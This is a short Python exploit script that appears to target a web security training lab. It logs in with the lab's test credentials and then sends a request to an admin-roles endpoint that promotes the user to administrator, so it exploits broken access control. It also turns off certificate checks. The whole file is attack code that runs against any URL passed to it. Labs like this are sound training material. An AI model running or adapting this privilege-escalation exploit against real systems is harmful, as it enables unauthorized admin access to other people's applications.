# imports
import requests
import sys
import urllib3

# disabling warnings
urllib3.disable_warnings(urllib3.exceptions.InsecurePlatformWarning)


def promote_to_admin(s, url):
    # logging in as user
    login_url = url+"/login"
    data_login ={"username": "wiener", "password": "peter"}
    r = s.post(login_url, data=data_login, verify=False)
    res = r.text
    if 'Log out' in r.text:
        print("(+) successfully Logged in as wiener")

                    #Exploit
        admin_roles_url = url+'/admin-roles?username=wiener&action=upgrade'
        r = s.get(admin_roles_url, verify=False)
        res = r.text
        if 'Admin panel' in res:
            print("(+) Exploit sucessfull user now promoted to Admin")
        else:
            print("(-) Exploit Failed user has not been promoted to Admin")
    else:
        print("(-) Failed to login as user")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    s = requests.session()
    url = sys.argv[1]
    promote_to_admin(s, url)

if __name__ == '__main__':
    main()